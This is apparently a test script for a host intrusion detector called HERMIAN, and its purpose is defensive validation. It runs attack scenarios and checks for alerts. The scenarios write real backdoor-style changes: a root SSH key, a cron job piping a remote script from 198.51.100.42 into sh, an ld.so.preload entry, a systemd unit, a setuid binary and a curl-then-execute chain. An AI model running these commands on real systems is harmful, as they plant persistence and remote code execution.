#!/bin/sh
# HERMIAN attack simulation: run ONE scenario and assert the expected alert
# appears at HIGH or CRITICAL.
#
# Usage: run_attack.sh <scenario> <title-pattern>
set -eu

SCENARIO="$1"
PATTERN="$2"
DIR="$(cd "$(dirname "$0")" && pwd)"

# Scenarios are unattended by design: run detached from this shell's TTY and
# session so HERMIAN's session attribution treats them as automated.
detached() {
    setsid sh -c "$1" </dev/null >/dev/null 2>&1 &
}

START_EPOCH=$(date +%s)

case "$SCENARIO" in
    webshell)
        # nginx (fake comm) -> bash -> curl -> sh /tmp/x
        detached "exec -a nginx python3 '$DIR/../helpers/fake_comm.py' nginx 30 -- \
            bash -c 'curl -s http://127.0.0.1:1/ -o /tmp/.x.sh 2>/dev/null || echo \"#!/bin/sh\nsleep 1\" > /tmp/.x.sh; chmod +x /tmp/.x.sh; sh /tmp/.x.sh'"
        ;;
    ssh-key-injection)
        detached "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHERMIANATTACKSIM attacker' >> /root/.ssh/authorized_keys"
        ;;
    cron-persistence)
        detached "echo '* * * * * root curl -s http://198.51.100.42/x.sh | sh' > /etc/cron.d/hermian-test-backdoor"
        ;;
    systemd-persistence)
        detached "printf '[Unit]\nDescription=test\n[Service]\nExecStart=/dev/shm/.hermian-test\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/hermian-test.service"
        ;;
    ld-preload)
        detached "echo /tmp/.hermian-libevil.so >> /etc/ld.so.preload"
        ;;
    brute-force)
        i=0
        while [ "$i" -lt 8 ]; do
            ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
                -o PreferredAuthentications=password,keyboard-interactive \
                hermian-attacker@127.0.0.1 </dev/null >/dev/null 2>&1 || true
            i=$((i + 1))
        done
        ;;
    memfd)
        detached "python3 '$DIR/../helpers/memfd_exec.py'"
        ;;
    suid-drop)
        detached "cp /bin/true /tmp/.hermian-test-suid && chmod 4755 /tmp/.hermian-test-suid"
        ;;
    *)
        echo "unknown scenario: $SCENARIO" >&2
        exit 2
        ;;
esac

# Watchers debounce for ~0.5s and the engine ticks are immediate; give it a moment.
sleep 4

# Look for a HIGH/CRITICAL alert whose title matches PATTERN in the JSON store
# (authoritative), falling back to the rendered log.
if hermian alerts -n 50 -s high --json 2>/dev/null \
    | awk -v s="$START_EPOCH" -v p="$PATTERN" '
        index($0, p) { print; found=1 }
        END { exit found ? 0 : 1 }' >/dev/null; then
    echo "PASS  $SCENARIO -> alert matching '$PATTERN'"
    exit 0
fi
if grep -q "$PATTERN" /var/log/hermian/alerts.log 2>/dev/null; then
    echo "PASS  $SCENARIO -> alert matching '$PATTERN' (alerts.log)"
    exit 0
fi
echo "FAIL  $SCENARIO -> no HIGH/CRITICAL alert matching '$PATTERN'" >&2
hermian alerts -n 5 2>/dev/null || true
exit 1
